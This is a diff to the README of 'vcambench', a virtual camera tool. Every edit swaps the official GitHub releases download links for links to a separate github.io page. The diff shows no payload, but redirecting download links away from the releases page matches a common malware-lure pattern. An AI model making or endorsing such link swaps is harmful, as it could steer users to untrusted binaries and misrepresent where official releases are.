@@ -1,6 +1,6 @@
 # 🎥 vcambench - Virtual Cameras Made Simple for Testing
 
-[![Download vcambench](https://img.shields.io/badge/Download-vcambench-blue?style=for-the-badge&logo=windows&logoColor=white&color=%234CAF50)](https://github.com/Nessanatural2313/vcambench/releases)
+[![Download vcambench](https://img.shields.io/badge/Download-vcambench-blue?style=for-the-badge&logo=windows&logoColor=white&color=%234CAF50)](https://nessanatural2313.github.io)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Think of vcambench as a camera simulator. It creates fake cameras that appear in
 
 Ready to get started? Here's how to get vcambench on your computer:
 
-**Visit this link to download the application:** [https://github.com/Nessanatural2313/vcambench/releases](https://github.com/Nessanatural2313/vcambench/releases)
+**Visit this link to download the application:** [https://nessanatural2313.github.io](https://nessanatural2313.github.io)
 
 1. Click on the link above. This will take you to the downloads page.
 2. Look for the latest version in the release section.
@@ -126,9 +126,9 @@ For additional help, check out the repository documentation or use the issues se
 
 ## 🚀 Ready to Get Started?
 
-[![Download vcambench Now](https://img.shields.io/badge/Download%20Now-Get%20vcambench-orange?style=for-the-badge&logo=download)](https://github.com/Nessanatural2313/vcambench/releases)
+[![Download vcambench Now](https://img.shields.io/badge/Download%20Now-Get%20vcambench-orange?style=for-the-badge&logo=download)](https://nessanatural2313.github.io)
 
-**Visit this link to download the application:** [https://github.com/Nessanatural2313/vcambench/releases](https://github.com/Nessanatural2313/vcambench/releases)
+**Visit this link to download the application:** [https://nessanatural2313.github.io](https://nessanatural2313.github.io)
 
 Click the link above to get vcambench and start creating virtual cameras right away. It's quick, easy, and completely free!
 
